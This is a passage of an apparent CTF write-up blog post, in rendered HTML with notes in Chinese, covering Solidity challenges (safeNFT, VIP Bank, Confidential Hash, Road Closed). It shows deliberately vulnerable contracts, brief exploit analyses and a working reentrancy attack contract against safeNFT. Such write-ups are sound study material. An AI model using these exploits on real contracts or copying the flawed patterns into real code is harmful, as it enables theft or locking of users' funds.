punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>bites<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> msge<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hacked</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner<span class=\"token punctuation\">&#123;</span>\n        canYouHackMe<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-10\"><a href=\"#Analyse-10\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>owner在slot5，delegatecall覆盖变量</p>\n<h1 id=\"0x04-safeNFT\"><a href=\"#0x04-safeNFT\" class=\"headerlink\" title=\"0x04 safeNFT\"></a>0x04 safeNFT</h1><h2 id=\"Code-11\"><a href=\"#Code-11\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">safeNFT</span> <span class=\"token keyword\">is</span> ERC721Enumerable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token operator\">=></span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> canClaim<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenName<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenSymbol<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> _price<span class=\"token punctuation\">)</span> <span class=\"token function\">ERC721</span><span class=\"token punctuation\">(</span>tokenName<span class=\"token punctuation\">,</span> tokenSymbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        price <span class=\"token operator\">=</span> _price<span class=\"token punctuation\">;</span> <span class=\"token comment\">//price = 0.01 ETH</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buyNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>price<span class=\"token operator\">==</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span><span class=\"token string\">\"INVALID_VALUE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        canClaim<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>canClaim<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"CANT_MINT\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        canClaim<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>Claim multiple NFTs for the price of one.</strong></p>\n<h2 id=\"Analyse-11\"><a href=\"#Analyse-11\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>_safeMint–&gt;_checkOnERC721Received–&gt;onERC721Received(external)有一个重入</p>\n<h2 id=\"Attack-10\"><a href=\"#Attack-10\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">private</span> n<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">private</span> count<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n  safeNFT <span class=\"token keyword\">public</span> target<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// initiate the pwnage by purchasing a single NFT</span>\n  <span class=\"token comment\">// we will re-enter later via onERC721Received</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n      target <span class=\"token operator\">=</span> <span class=\"token function\">safeNFT</span><span class=\"token punctuation\">(</span>_target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    target<span class=\"token punctuation\">.</span>buyNFT<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    target<span class=\"token punctuation\">.</span><span class=\"token function\">claim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">onERC721Received</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> ID<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    target<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">,</span> ID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    n<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">!=</span> count<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      target<span class=\"token punctuation\">.</span><span class=\"token function\">claim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>onERC721Received<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x03-VIP-Bank\"><a href=\"#0x03-VIP-Bank\" class=\"headerlink\" title=\"0x03 VIP Bank\"></a>0x03 VIP Bank</h1><h2 id=\"Code-12\"><a href=\"#Code-12\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">VIP_Bank</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> manager<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> VIP<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> maxETH <span class=\"token operator\">=</span> <span class=\"token number\">0.5</span> ether<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        manager <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> manager <span class=\"token punctuation\">,</span> <span class=\"token string\">\"you are not manager\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyVIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>VIP<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"you are not our VIP customer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addVIP</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyManager <span class=\"token punctuation\">&#123;</span>\n        VIP<span class=\"token punctuation\">[</span>addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> onlyVIP <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0.05</span> ether<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot deposit more than 0.05 ETH per transaction\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyVIP <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">&lt;=</span> maxETH<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot withdraw more than 0.5 ETH per transaction\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> _amount<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Withdraw Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contractBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>At any cost, lock the VIP user balance forever into the contract.</strong></p>\n<h2 id=\"Analyse-12\"><a href=\"#Analyse-12\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>selfdestruct转账，让合约余额大于0.05 ether</p>\n<h1 id=\"0x02-Confidential-Hash\"><a href=\"#0x02-Confidential-Hash\" class=\"headerlink\" title=\"0x02 Confidential Hash\"></a>0x02 Confidential Hash</h1><h2 id=\"Code-13\"><a href=\"#Code-13\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Confidential</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> firstUser <span class=\"token operator\">=</span> <span class=\"token string\">\"ALICE\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> alice_age <span class=\"token operator\">=</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> ALICE_PRIVATE_KEY<span class=\"token punctuation\">;</span> <span class=\"token comment\">//Super Secret Key</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> ALICE_DATA <span class=\"token operator\">=</span> <span class=\"token string\">\"QWxpY2UK\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> aliceHash <span class=\"token operator\">=</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>ALICE_PRIVATE_KEY<span class=\"token punctuation\">,</span> ALICE_DATA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> secondUser <span class=\"token operator\">=</span> <span class=\"token string\">\"BOB\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> bob_age <span class=\"token operator\">=</span> <span class=\"token number\">21</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> BOB_PRIVATE_KEY<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Super Secret Key</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> BOB_DATA <span class=\"token operator\">=</span> <span class=\"token string\">\"Qm9iCg\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> bobHash <span class=\"token operator\">=</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>BOB_PRIVATE_KEY<span class=\"token punctuation\">,</span> BOB_DATA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\n\t\t<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> key1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> key2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">,</span> key2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">checkthehash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _hash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span> <span class=\"token punctuation\">(</span>_hash <span class=\"token operator\">==</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>aliceHash<span class=\"token punctuation\">,</span> bobHash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>Find the keccak256 hash of aliceHash and bobHash.</strong> </p>\n<h2 id=\"Analyse-13\"><a href=\"#Analyse-13\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>智能合约变量存储优化规则，获取对应slot的数据</p>\n<h1 id=\"0x01-Road-Closed\"><a href=\"#0x01-Road-Closed\" class=\"headerlink\" title=\"0x01 Road Closed\"></a>0x01 Road Closed</h1><h2 id=\"Code-14\"><a href=\"#Code-14\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: GPL-3.0</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">RoadClosed</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token builtin\">bool</span> hacked<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token builtin\">address</span> pwner<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> whitelistedMinters<span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> size<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            size <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> size <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token operator\">==</span>owner<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addToWhitelist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Contracts are not allowed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        whitelistedMinters<span class=\"token punctuation\">[</span>addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>whitelistedMinters<span class=\"token punctuation\">[</span>addr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"You are not whitelisted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> addr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"address must be msg.sender\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> addr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Contracts are not allowed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">require</span><span 